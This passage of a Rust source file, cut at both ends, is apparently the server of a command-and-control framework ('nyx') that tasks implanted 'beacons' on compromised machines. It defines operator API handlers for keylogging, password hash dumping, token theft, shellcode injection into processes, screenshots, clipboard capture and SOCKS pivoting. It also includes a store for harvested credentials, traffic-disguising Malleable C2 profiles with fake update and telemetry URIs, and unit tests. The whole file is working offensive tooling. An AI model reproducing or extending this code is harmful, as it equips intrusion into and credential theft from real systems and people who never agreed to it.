                jitter_pct,
            } => Command::Sleep {
                seconds,
                jitter_pct,
            },
            JsonCommand::Upload { name, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Upload { name, data }
            }
            JsonCommand::Download { path } => Command::Download { path },
            JsonCommand::Bof {
                name,
                args,
                data_hex,
            } => {
                let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Bof { name, args, blob }
            }
            JsonCommand::FileOp { op, path, dest } => {
                let fileop = match op.as_str() {
                    "cd" => FileOp::Cd,
                    "mkdir" => FileOp::Mkdir,
                    "rm" => FileOp::Rm,
                    "mv" => FileOp::Mv,
                    "cp" => FileOp::Cp,
                    _ => return Err("bad file op"),
                };
                Command::FileOp {
                    op: fileop,
                    path,
                    dest,
                }
            }
            JsonCommand::Connect { host, port } => {
                Command::Connect {
                    proto: 0, // TCP
                    host,
                    port,
                    chan: next_chan(),
                }
            }
            JsonCommand::Socks {
                chan,
                op,
                addr,
                port,
            } => Command::Socks {
                chan,
                op,
                addr,
                port,
            },
            JsonCommand::Screenshot { monitor } => Command::Screenshot { monitor },
            JsonCommand::Portscan { host, ports } => Command::Portscan { host, ports },
            JsonCommand::Net { query } => Command::Net { query },
            JsonCommand::Driveinfo => Command::DriveInfo,
            JsonCommand::Clipboard => Command::Clipboard,
            JsonCommand::Env { name } => Command::Env { name },
            JsonCommand::Keylog { action } => Command::Keylog { action },
            JsonCommand::Screenwatch { interval_secs } => Command::Screenwatch { interval_secs },
            JsonCommand::Hashdump { method } => Command::Hashdump { method },
            JsonCommand::ChannelData { chan, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::ChannelData { chan, data }
            }
            JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
            JsonCommand::StealToken { pid } => Command::StealToken { pid },
            JsonCommand::MakeToken {
                domain,
                user,
                password,
                logon_type,
            } => Command::MakeToken {
                domain,
                user,
                password,
                logon_type,
            },
            JsonCommand::Rev2Self => Command::Rev2Self,
            JsonCommand::GetUid => Command::GetUid,
            JsonCommand::Inject {
                method,
                pid,
                spawn_to,
                sc_hex,
            } => {
                let shellcode = hex::decode(&sc_hex).map_err(|_| "invalid hex in sc_hex")?;
                Command::Inject {
                    method,
                    pid,
                    spawn_to,
                    shellcode,
                }
            }
            JsonCommand::Exit => Command::Exit,
        })
    }
}

#[derive(Serialize)]
struct TaskAck {
    task_id: u64,
    /// 对 Connect 命令，server 分配的 channel id（操作员用它发后续 /socks）。
    /// 其他命令为 None。
    #[serde(skip_serializing_if = "Option::is_none")]
    chan: Option<u32>,
}

fn parse_session_hex(s: &str) -> Option<SessionId> {
    // Reject by length BEFORE decoding: a session id is exactly 32 bytes = 64
    // hex chars. hex::decode allocates s.len()/2 bytes upfront, so decoding an
    // arbitrary-length operator/client string first is an allocation bomb
    // (a 4 MB hex string → a 2 MB transient allocation before the length check
    // rejects it).
    if s.len() != 64 {
        return None;
    }
    let v = hex::decode(s).ok()?;
    <[u8; 32]>::try_from(v.as_slice()).ok()
}

async fn post_task(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<TaskReq>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot task beacons",
        )
            .into_response();
    }
    let id = match parse_session_hex(&req.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let command = match req.command.into_command() {
        Ok(c) => c,
        Err(msg) => return (StatusCode::BAD_REQUEST, msg).into_response(),
    };
    let mut s = match st.sessions.get_mut(&id) {
        Some(s) => s,
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    // Back-pressure: refuse to enqueue past the per-session cap so an operator
    // (or a compromised token) can't grow pending unbounded → OOM. The implant
    // drains pending each beacon cycle, so a full queue means the beacon is
    // dead/stuck and queueing more is pointless anyway.
    if s.pending.len() >= MAX_PENDING_PER_SESSION {
        return (
            StatusCode::SERVICE_UNAVAILABLE,
            "pending task queue full (beacon not draining?)",
        )
            .into_response();
    }
    let task_id = s.next_task_id;
    s.next_task_id += 1;
    // 如果是 Connect，把 server 分配的 chan 回传给操作员（供后续 /socks 用）。
    let chan = match &command {
        Command::Connect { chan, .. } => Some(*chan),
        _ => None,
    };
    let cmd_name = command_name(&command);
    // Command::Exit instructs the implant to terminate; fire SessionExit now so
    // operator hooks (`on_session_exit`) actually run. Previously the event was
    // dispatched by the Rhai/tracing hooks but never produced, leaving
    // `on_session_exit` dead code. We snapshot the intent before queuing (the
    // event reflects "this session is exiting now") and fire AFTER dropping the
    // write guard — the same liveness discipline `handle_beacon` uses for
    // ResultReceived — so a slow operator script can't block this session's
    // DashMap shard. `req.session` is the validated hex session id.
    let fire_exit = matches!(command, Command::Exit);
    s.pending.push(Task { task_id, command });
    drop(s);
    if fire_exit {
        st.events.fire(&nyx_scripting::Event::SessionExit(
            nyx_scripting::SessionExit {
                session_id: req.session.clone(),
            },
        ));
    }
    if let Some(audit) = &st.audit {
        audit.append(
            "task",
            &op.name,
            &req.session,
            serde_json::json!({ "task_id": task_id, "command": cmd_name }),
        );
    }
    (StatusCode::OK, Json(TaskAck { task_id, chan })).into_response()
}

#[derive(Deserialize)]
struct ResultsQuery {
    session: String,
}

#[derive(Serialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
    /// Present only for `FileChunk` results (hex-encoded chunk bytes).
    #[serde(skip_serializing_if = "Option::is_none")]
    data_hex: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    seq: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    eof: Option<u8>,
}

async fn get_results(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot drain results",
        )
            .into_response();
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let drained = match st.sessions.get_mut(&id) {
        Some(mut s) => std::mem::take(&mut s.results),
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let views: Vec<ResultView> = drained
        .into_iter()
        .map(|r| {
            let (kind, text, data_hex, seq, eof) = match r.response {
                MsgResponse::Output(b) => (
                    "output",
                    String::from_utf8_lossy(&b).into_owned(),
                    None,
                    None,
                    None,
                ),
                MsgResponse::Ok => ("ok", String::new(), None, None, None),
                MsgResponse::Err(m) => ("error", m, None, None, None),
                MsgResponse::FileChunk {
                    name,
                    seq,
                    eof,
                    data,
                } => (
                    "file",
                    format!("<chunk {name}#{seq}>"),
                    Some(hex::encode(&data)),
                    Some(seq),
                    Some(eof),
                ),
                MsgResponse::BofOutput(b) => (
                    "bof",
                    String::from_utf8_lossy(&b).into_owned(),
                    None,
                    None,
                    None,
                ),
                MsgResponse::Channel { chan, status, data } => (
                    "channel",
                    format!("<chan {chan}#{status}>"),
                    Some(hex::encode(&data)),
                    None,
                    None,
                ),
                MsgResponse::Image(d) => (
                    "image",
                    format!("<screenshot {} bytes>", d.len()),
                    Some(hex::encode(&d)),
                    None,
                    None,
                ),
            };
            ResultView {
                task_id: r.task_id,
                kind: kind.to_string(),
                text,
                data_hex,
                seq,
                eof,
            }
        })
        .collect();
    (StatusCode::OK, Json(views)).into_response()
}

// ---- /api/creds — Phase 2 persistent credential store ---------------------

#[derive(Deserialize)]
struct CredsQuery {
    /// `?reveal=1` returns cleartext secrets; the default MASKS them so a list
    /// GET never sprays every harvested hash to a glance.
    #[serde(default)]
    reveal: Option<u8>,
    /// Optional `?kind=hash|password|ticket|key` filter.
    #[serde(default)]
    kind: Option<String>,
}

/// `GET /api/creds` — list stored credentials. Secrets masked unless `?reveal=1`.
async fn list_creds(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<CredsQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if q.reveal.unwrap_or(0) == 1 && op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot reveal plaintext secrets",
        )
            .into_response();
    }
    let mut rows = match st.creds.list() {
        Ok(r) => r,
        Err(e) => {
            tracing::error!(error = %e, "cred store list failed");
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response();
        }
    };
    if let Some(k) = &q.kind {
        if let Some(want) = nyx_store::CredKind::from_label(k) {
            rows.retain(|r| r.kind == want);
        }
    }
    if q.reveal.unwrap_or(0) != 1 {
        for r in &mut rows {
            r.secret = nyx_store::mask_secret(&r.secret);
        }
    }
    (StatusCode::OK, Json(rows)).into_response()
}

/// `POST /api/creds` — upsert a credential (add OR update-in-place by
/// `(realm, user, kind)` — CS parity: a re-dump overwrites the old secret).
async fn post_creds(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(rec): Json<nyx_store::CredRecord>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot add credentials",
        )
            .into_response();
    }
    match st.creds.upsert(&rec) {
        Ok(()) => {
            if let Some(audit) = &st.audit {
                audit.append(
                    "cred_add",
                    &op.name,
                    &format!("{}\\{}", rec.realm, rec.user),
                    serde_json::json!({ "kind": rec.kind.label() }),
                );
            }
            (
                StatusCode::OK,
                Json(serde_json::json!({
                    "ok": true,
                    "key": [rec.realm, rec.user, rec.kind.label()]
                })),
            )
                .into_response()
        }
        Err(e) => {
            tracing::error!(error = %e, "cred store upsert failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response()
        }
    }
}

#[derive(Deserialize)]
struct CredKey {
    realm: String,
    user: String,
    kind: String,
}

/// `POST /api/creds/delete` — delete by composite key (JSON body, to avoid
/// path-encoding realm/user).
async fn delete_cred(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(key): Json<CredKey>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot delete credentials",
        )
            .into_response();
    }
    let kind = match nyx_store::CredKind::from_label(&key.kind) {
        Some(k) => k,
        None => return (StatusCode::BAD_REQUEST, "bad kind").into_response(),
    };
    match st.creds.delete(&key.realm, &key.user, kind) {
        Ok(deleted) => {
            if let Some(audit) = &st.audit {
                audit.append(
                    "cred_delete",
                    &op.name,
                    &format!("{}\\{}", key.realm, key.user),
                    serde_json::json!({ "kind": kind.label(), "deleted": deleted }),
                );
            }
            (
                StatusCode::OK,
                Json(serde_json::json!({ "deleted": deleted })),
            )
                .into_response()
        }
        Err(e) => {
            tracing::error!(error = %e, "cred store delete failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("cred store: {e}"),
            )
                .into_response()
        }
    }
}

/// `GET /api/audit` — query the action audit log. Admin-only for the full log;
/// a non-admin operator is restricted to their OWN records (server-enforced
/// regardless of the `?operator=` query). 401 on no/bad auth.
async fn get_audit(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(mut q): Query<audit::AuditQuery>,
) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    let Some(audit) = &st.audit else {
        return (StatusCode::OK, Json(Vec::<audit::AuditRecord>::new())).into_response();
    };
    if op.role != operators::Role::Admin {
        q.operator = Some(op.name.clone());
    }
    match audit.query(&q) {
        Ok(rows) => (StatusCode::OK, Json(rows)).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response(),
    }
}

/// `GET /api/audit/verify` — walk the hash-chain. `{ "ok": bool, "broken_at": Option<u64> }`.
async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    let op = match authenticate(&st, &headers) {
        AuthOutcome::Allowed(o) => o,
        AuthOutcome::Denied(r) => return r,
    };
    if op.role == operators::Role::Viewer {
        return (
            StatusCode::FORBIDDEN,
            "forbidden: viewer role cannot verify audit log",
        )
            .into_response();
    }
    let Some(audit) = &st.audit else {
        return (StatusCode::OK, Json(serde_json::json!({ "ok": true }))).into_response();
    };
    let broken = match audit::AuditWriter::verify_chain(audit.path()) {
        Ok(b) => b,
        Err(e) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, format!("audit: {e}")).into_response()
        }
    };
    (
        StatusCode::OK,
        Json(serde_json::json!({ "ok": broken.is_none(), "broken_at": broken })),
    )
        .into_response()
}

/// Short name for a wire [`Command`] variant (for operator-facing views).
fn command_name(c: &Command) -> &'static str {
    match c {
        Command::Ping => "ping",
        Command::Sleep { .. } => "sleep",
        Command::Shell { .. } => "shell",
        Command::Upload { .. } => "upload",
        Command::Download { .. } => "download",
        Command::Bof { .. } => "bof",
        Command::Connect { .. } => "connect",
        Command::Socks { .. } => "socks",
        Command::FileOp { .. } => "fileop",
        Command::Screenshot { .. } => "screenshot",
        Command::Portscan { .. } => "portscan",
        Command::Net { .. } => "net",
        Command::DriveInfo => "driveinfo",
        Command::Clipboard => "clipboard",
        Command::Env { .. } => "env",
        Command::Keylog { .. } => "keylog",
        Command::Screenwatch { .. } => "screenwatch",
        Command::Hashdump { .. } => "hashdump",
        Command::ChannelData { .. } => "channeldata",
        Command::ChannelClose { .. } => "channelclose",
        Command::StealToken { .. } => "stealtoken",
        Command::MakeToken { .. } => "maketoken",
        Command::Rev2Self => "rev2self",
        Command::GetUid => "getuid",
        Command::Inject { .. } => "inject",
        Command::Exit => "exit",
    }
}

#[derive(Serialize)]
struct TaskView {
    task_id: u64,
    command: String,
}

/// `GET /api/tasks?session=<hex>` — the pending task queue for a session.
async fn get_tasks(
    State(st): State<Arc<AppState>>,
    headers: HeaderMap,
    Query(q): Query<ResultsQuery>,
) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let views: Vec<TaskView> = match st.sessions.get(&id) {
        Some(s) => s
            .pending
            .iter()
            .map(|t| TaskView {
                task_id: t.task_id,
                command: command_name(&t.command).to_string(),
            })
            .collect(),
        None => Vec::new(),
    };
    Json(views).into_response()
}

#[derive(Serialize)]
struct ProfileView {
    loaded: bool,
    http_get_uri: Option<String>,
    http_post_uri: Option<String>,
    useragent: Option<String>,
}

/// `GET /api/profile` — the active Malleable C2 profile summary (or `loaded:
/// false`). Lets an operator / the Tauri client see what's shaping traffic.
async fn get_profile(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    let view = ProfileView {
        loaded: st.profile.is_some(),
        http_get_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_get())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        http_post_uri: st
            .profile
            .as_ref()
            .and_then(|p| p.http_post())
            .and_then(|b| b.get("uri"))
            .map(|u| u.as_str().into_owned()),
        useragent: st
            .profile
            .as_ref()
            .and_then(|p| p.option("useragent"))
            .map(|u| u.as_str().into_owned()),
    };
    Json(view).into_response()
}

#[cfg(test)]
mod tests {
    use super::*;

    const MIN_PROFILE: &str = r#"http-get { set uri "/api/v1/Updates"; client { metadata { header "Cookie"; } } server { output { print; } } } http-post { set uri "/api/v1/Telemetry"; client { output { print; } } server { output { print; } } }"#;

    #[test]
    fn load_profile_accepts_valid() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("ok.profile");
        std::fs::write(&path, MIN_PROFILE).unwrap();
        let p = load_profile(&path).expect("valid profile must load + lint clean");
        assert_eq!(
            p.http_post().unwrap().get("uri").unwrap().as_str(),
            "/api/v1/Telemetry"
        );
    }

    #[test]
    fn load_profile_rejects_lint_errors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad.profile");
        // missing http-get -> c2lint error
        std::fs::write(
            &path,
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        )
        .unwrap();
        assert!(
            load_profile(&path).is_err(),
            "a profile with lint errors must be rejected"
        );
    }

    #[test]
    fn keypair_persists_across_restart() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("server.key");
        let kp1 = load_or_create_keypair(&path).expect("create keypair");
        assert!(path.exists(), "keyfile must be created");
        let pub1 = kp1.public_bytes();
        // A second load must restore the SAME identity (sessions survive restart).
        let kp2 = load_or_create_keypair(&path).expect("reload keypair");
        assert_eq!(
            kp2.public_bytes(),
            pub1,
            "reloading the keyfile must restore the same identity"
        );
    }

    #[test]
    fn load_script_compiles_valid_and_rejects_bad() {
        let dir = tempfile::tempdir().unwrap();
        let good = dir.path().join("ok.rhai");
        std::fs::write(&good, r#"fn on_session_new(s) { nyx_log(s["hostname"]); }"#).unwrap();
        assert!(load_script(&good).is_ok(), "valid Rhai script must compile");

        let bad = dir.path().join("bad.rhai");
        std::fs::write(&bad, "fn ( broken").unwrap();
        assert!(
            load_script(&bad).is_err(),
            "a syntactically broken script must be rejected"
        );
    }

    #[test]
    fn parse_session_hex_rejects_wrong_length_without_allocating() {
        // A session id is exactly 32 bytes = 64 hex chars. The parser must
        // reject any other length WITHOUT first calling hex::decode on the whole
        // string (which would allocate s.len()/2 bytes — an allocation bomb when
        // an operator/client sends a multi-MB hex string). Pin: wrong lengths
        // return None, and a gigantic string doesn't blow up.
        // 64 valid hex chars → 32 bytes → Some.
        let valid = "00".repeat(32);
        assert!(parse_session_hex(&valid).is_some());
        // Odd length, too short, too long, empty, non-hex — all None.
        assert!(parse_session_hex("00").is_none());
        assert!(parse_session_hex(&"0".repeat(63)).is_none());
        assert!(parse_session_hex(&"0".repeat(65)).is_none());
        assert!(parse_session_hex("").is_none());
        assert!(parse_session_hex(&"z".repeat(64)).is_none());
        // The allocation-bomb regression: a 4 MB hex string must NOT cause a
        // ~2 MB allocation before being rejected. We can't directly measure the
        // alloc, but if parse_session_hex short-circuits on length first, this
        // is essentially free; if it decodes first, it's a 2 MB transient.
        let huge = "ab".repeat(2 * 1024 * 1024); // 4 MB string, wrong length anyway
        assert!(parse_session_hex(&huge).is_none());
        // And a length-64-but-non-hex string is rejected by decode, not length.
        assert!(parse_session_hex(&'z'.to_string().repeat(64)).is_none());
    }

    #[test]
    fn constant_time_eq_handles_length_mismatch_and_content_diffs() {
        // A timing-constant compare can't be proven by a black-box test, but we
        // CAN pin the correctness contract that must hold for the length-tolerant
        // implementation: it must return the right answer for length-mismatched
        // inputs (no short-circuit returning a wrong `true`) and for every
        // single-byte difference. The actual constant-time guarantee is upheld
        // by the implementation scanning min(len) bytes and OR-ing in a length
        // flag — reviewed, not tested.
        let eq = |a: &[u8], b: &[u8]| constant_time_eq(a, b);
        // equal
        assert!(eq(b"secret-token", b"secret-token"));
        assert!(eq(b"", b""));
        // length mismatch — must be false even with a matching prefix
        assert!(!eq(b"abc", b"abcd"));
        assert!(!eq(b"abcd", b"abc"));
        assert!(!eq(b"", b"x"));
        assert!(!eq(b"x", b""));
        // length difference > 255 must NOT collide with equal-length via a
        // truncated low-byte length check (regression for an earlier impl that
        // did `(a.len() ^ b.len()) as u8`, where 256 xor 0 → 0).
        assert!(!eq(&vec![0u8; 256], &[] as &[u8]));
        assert!(!eq(&vec![0u8; 512], &vec![0u8; 256]));
        // same length, every single-byte difference must be detected
        for i in 0..32u8 {
            let mut a = vec![0u8; 32];
            let mut b = vec![0u8; 32];
            a[i as usize] = 1;
            assert!(!eq(&a, &b), "diff at byte {i} must compare unequal");
            b[i as usize] = 1;
            assert!(eq(&a, &b), "re-equalized at byte {i} must compare equal");
        }
    }

    // ---- JsonCommand → Command 映射（FileOp / Connect / Socks）----

    #[test]
    fn fileop_mkdir_maps() {
        let cmd = JsonCommand::FileOp {
            op: "mkdir".into(),
            path: "/tmp/x".into(),
            dest: None,
        }
        .into_command()
        .expect("mkdir 应映射成功");
        assert!(matches!(
            cmd,
            Command::FileOp {
                op: FileOp::Mkdir,
                ..
            }
        ));
    }

    #[test]
    fn fileop_mv_maps_with_dest() {
        let cmd = JsonCommand::FileOp {
            op: "mv".into(),
            path: "a".into(),
            dest: Some("b".into()),
        }
        .into_command()
        .unwrap();
        assert!(matches!(
            cmd,
            Command::FileOp { op: FileOp::Mv, path, dest: Some(_) } if path == "a"
        ));
    }

    #[test]
    fn fileop_bad_op_errors() {
        assert!(matches!(
            JsonCommand::FileOp {
                op: "wat".into(),
                path: "x".into(),
                dest: None
            }
            .into_command(),
            Err("bad file op")
        ));
    }

    #[test]
    fn connect_maps_with_chan() {
        let cmd = JsonCommand::Connect {
            host: "10.0.0.1".into(),
            port: 445,
        }
        .into_command()
        .unwrap();
        match cmd {
            Command::Connect {
                host, port, chan, ..
            } => {
                assert_eq!(host, "10.0.0.1");
                assert_eq!(port, 445);
                assert!(chan > 0, "chan 必须由 server 分配，>0");
            }
            _ => panic!("应为 Connect"),
        }
    }

    #[test]
    fn socks_maps_passthrough() {
        let cmd = JsonCommand::Socks {
            chan: 5,
            op: 1,
            addr: "1.2.3.4".into(),
            port: 80,
        }
        .into_command()
        .unwrap();
        assert!(matches!(cmd, Command::Socks { chan: 5, op: 1, .. }));
    }

    // ---- Anti-replay (authoritative write-guard check) ---------------------
    //
    // These two tests pin the security fix that moved the replay decision INTO
    // the write guard (`sessions.get_mut`), closing the TOCTOU where two
    // concurrent beacons carrying the same counter could both pass the advisory
    // read-guard check and split the check from the commit. The server runs
    // under `panic = "abort"`, so these also guard against regressions that
    // would panic on a raced/missing session entry.

    /// Build a sealed check-in frame (SessionInfo) for `counter` carrying
    /// `pubkey`, keyed under the server in `st`. Mirrors what a dev implant
    /// sends on first contact. Returns the derived session key + the frame.
    fn checkin_frame(st: &AppState, pubkey: &[u8; 32], counter: u64) -> (SessionKey, Vec<u8>) {
        let key = st.keypair.derive_for(pubkey);
        let info = SessionInfo {
            beacon_id: 0x1337,
            hostname: "test-host".into(),
            username: "test-user".into(),
            os: "linux".into(),
            arch: 1,
            pid: 42,
            is_admin: 0,
        };
        let mut w = nyx_protocol::wire::Writer::new();
        info.encode(&mut w)
            .expect("test SessionInfo fields are tiny literals << MAX_BLOB_LEN");
        let plaintext = w.into_bytes();
        let frame = encode_frame_dir(pubkey, Direction::ClientToServer, counter, &key, &plaintext);
        (key, frame)
    }

    /// Build a sealed "subsequent" frame (an empty TaskResponse batch) for an
    /// existing session — the shape every post-check-in beacon carries.
    fn response_frame(pubkey: &[u8; 32], key: &SessionKey, counter: u64) -> Vec<u8> {
        let plaintext = TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially");
        encode_frame_dir(pubkey, Direction::ClientToServer, counter, key, &plaintext)
    }

    #[test]
    fn anti_replay_stale_counter_is_rejected() {
        // A replayed/old counter must be rejected by the AUTHORITATIVE write-guard
        // check — the advisory read-guard check is only an optimization that
        // skips a decrypt for an obvious stale frame.
        let st = AppState::default();
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("first check-in must register the session");
        // A legitimate advance to counter 2 succeeds.
        let frame2 = response_frame(&pubkey, &key, 2);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
            .expect("counter 2 must advance");
        // Replaying counter 2 (stale: counter <= last_recv) must be rejected.
        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame2)
            .expect_err("a stale counter must be rejected, not accepted");
        assert!(
            err.to_string().contains("replayed/stale counter"),
            "expected a replay rejection, got: {err}"
        );
    }

    #[test]
    fn anti_replay_concurrent_same_counter_only_one_wins() {
        // Two beacons carrying the SAME counter, fired concurrently against one
        // session: the authoritative check inside the write guard must let
        // exactly ONE through and reject the other. Before the fix both could
        // pass the advisory read-guard check before either committed last_recv.
        let st = std::sync::Arc::new(AppState::default());
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect("check-in must register the session");

        // Race N times on monotonically-increasing counters. A single iteration
        // could accidentally serialize on a loaded CI box; N iterations make a
        // scheduling fluke that lets both through astronomically unlikely and
        // pin the authoritative-check guarantee across runs. (Each iteration
        // races a FRESH higher counter so the prior commit doesn't make both
        // threads see a stale replay.)
        for i in 0..50u64 {
            let counter = 2 + i;
            let frame = response_frame(&pubkey, &key, counter);
            let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
            let mut handles = Vec::new();
            for _ in 0..2 {
                let st = st.clone();
                let frame = frame.clone();
                let barrier = barrier.clone();
                handles.push(std::thread::spawn(move || {
                    barrier.wait();
                    handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame).is_ok()
                }));
            }
            let results: Vec<bool> = handles.into_iter().map(|h| h.join().unwrap()).collect();
            let oks = results.iter().filter(|&&ok| ok).count();
            assert_eq!(
                oks, 1,
                "iter {i}: exactly one concurrent same-counter beacon must succeed, got {results:?}"
            );
        }
    }

    // ---- DoS / safety-guard coverage ---------------------------------------
    //
    // These pin the server's memory/existence guards that previously had ZERO
    // test coverage (flagged by the adversarial review): the session-registry
    // cap, the per-session results eviction, the kill-date burn switch, and the
    // hex-decode rejection paths in JsonCommand. All are guards a regression
    // would silently weaken, so each gets a deterministic test.

    /// Minimal valid `Session` for filling the registry without per-entry crypto.
    fn dummy_session() -> Session {
        Session {
            key: SessionKey::new([0u8; 32]),
            info: SessionInfo {
                beacon_id: 0,
                hostname: String::new(),
                username: String::new(),
                os: String::new(),
                arch: 0,
                pid: 0,
                is_admin: 0,
            },
            last_recv: 0,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created: Instant::now(),
            ja3: None,
            ja4: None,
        }
    }

    #[test]
    fn max_sessions_cap_rejects_checkin_beyond_limit() {
        // Beacon check-in is unauthenticated (anyone who speaks the protocol
        // registers), so the registry cap is the only thing stopping a distinct-
        // key flood from OOMing the server. Fill it to the cap with dummy
        // sessions, then assert a fresh check-in is refused.
        let st = AppState::default();
        for i in 0..MAX_SESSIONS as u32 {
            let mut pk = [0u8; 32];
            pk[0..4].copy_from_slice(&i.to_le_bytes());
            st.sessions.insert(pk, dummy_session());
        }
        assert_eq!(st.sessions.len(), MAX_SESSIONS);

        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7777".parse().unwrap();
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
        let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
            .expect_err("a check-in past the session cap must be rejected");
        assert!(
            err.to_string().contains("session registry full"),
            "expected a registry-full rejection, got: {err}"
        );
    }

    #[test]
    fn results_buffer_evicts_oldest_past_cap() {
        // A rogue/compromised implant streaming Output/FileChunk blobs could
        // fill RAM forever; the per-session results buffer evicts the oldest
        // entries past MAX_RESULTS_PER_SESSION. Drive it in ONE beacon carrying
        // cap+100 responses (one crypto op, exercises the in-loop drain).
        let st = AppState::default();
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7776".parse().unwrap();
        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in");

        let overflow = 100;
        let batch: Vec<TaskResponse> = (0..(MAX_RESULTS_PER_SESSION as u64 + overflow))
            .map(|i| TaskResponse {
                task_id: i,
                response: MsgResponse::Ok,
            })
            .collect();
        let plaintext = TaskResponse::encode_vec(&batch).expect("batch of Ok encodes trivially");
        let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, 2, &key, &plaintext);
        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &frame)
            .expect("ingest of oversized result batch");

        let s = st.sessions.get(&pubkey).expect("session present");
        assert_eq!(
            s.results.len(),
            MAX_RESULTS_PER_SESSION,
            "results must be capped, not grown unbounded"
        );
        // Oldest `overflow` entries are evicted; first survivor is task `overflow`.
        assert_eq!(
            s.results.first().unwrap().task_id,
            overflow,
            "oldest surviving result must be task {overflow}, not task 0"
        );
        assert!(
            s.results.iter().all(|r| r.task_id >= overflow),
            "no evicted task id should remain"
        );
    }

    #[test]
    fn killdate_past_refuses_beacons_and_future_allows() {
        // The kill-date is the operator's "burn the server" switch: once wall
        // time passes it, the server stops serving beacons entirely. Checked at
        // the top of handle_beacon, before parse_frame, so it refuses regardless
        // of the body. Past → refuse; far-future → proceed.
        let pubkey = ServerKeypair::generate().public_bytes();
        let peer: std::net::SocketAddr = "127.0.0.1:7775".parse().unwrap();

        let st = AppState {
            killdate: Some(1), // 1970-01-01 — always in the past.
            ..AppState::default()
        };
        let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
